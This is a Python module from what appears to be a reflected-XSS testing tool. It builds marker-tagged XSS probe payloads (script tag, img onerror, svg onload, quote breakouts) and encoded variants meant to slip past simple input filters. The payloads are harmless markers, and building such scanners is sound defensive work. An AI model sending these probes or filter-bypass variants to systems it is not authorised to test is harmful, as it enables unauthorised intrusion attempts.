"""
payloads.py
-----------
Safe, non-destructive XSS payload set used for reflection testing.

Every payload embeds a unique marker string so the detector can verify a
*genuine* reflection came from the payload we sent, rather than a false
positive caused by unrelated page content.

None of these payloads perform any real exploitation action (no cookie
theft, no redirects, no external network calls) -- they simply attempt to
break out of common injection contexts and render a harmless marker that
we can search for in the response body.
"""

import html
import urllib.parse
import uuid


def generate_marker() -> str:
    """Generate a short unique marker to identify this specific test run."""
    return "xss" + uuid.uuid4().hex[:8]


def build_payload_set(marker: str):
    """
    Build a list of (payload_name, raw_payload) tuples using the given marker.

    Covers common reflected-XSS breakout contexts:
      - raw HTML tag injection
      - HTML attribute breakout
      - event handler injection
      - basic quote / angle-bracket breakout
    """
    return [
        ("basic_script_tag", f"<script>/*{marker}*/</script>"),
        ("img_onerror", f'<img src=x onerror=alert("{marker}")>'),
        ("svg_onload", f'<svg onload=alert("{marker}")>'),
        ("attribute_breakout", f'"><b>{marker}</b>'),
        ("single_quote_breakout", f"'><b>{marker}</b>"),
        ("angle_bracket_only", f"<{marker}>"),
        ("html_comment_marker", f"<!--{marker}-->"),
    ]


def encode_variants(payload: str):
    """
    Return a dict of encoded variants of a payload so the framework can test
    whether basic input filters can be bypassed by simple encoding tricks.

    Keys returned:
      raw            - unmodified payload
      url_encoded    - percent-encoded (safe for GET query strings)
      double_url_enc - percent-encoded twice
      html_entity    - HTML entity encoded (&lt; &gt; etc.)
      mixed_case     - alternates case of letters inside <tag> constructs
    """
    return {
        "raw": payload,
        "url_encoded": urllib.parse.quote(payload),
        "double_url_enc": urllib.parse.quote(urllib.parse.quote(payload)),
        "html_entity": html.escape(payload),
        "mixed_case": _mixed_case(payload),
    }


def _mixed_case(payload: str) -> str:
    """Randomize letter case only inside <tag> constructs, e.g. <ScRiPt>."""
    out = []
    inside_tag = False
    toggle = False
    for ch in payload:
        if ch == "<":
            inside_tag = True
        if ch == ">":
            inside_tag = False
        if inside_tag and ch.isalpha():
            out.append(ch.upper() if toggle else ch.lower())
            toggle = not toggle
        else:
            out.append(ch)
    return "".join(out)
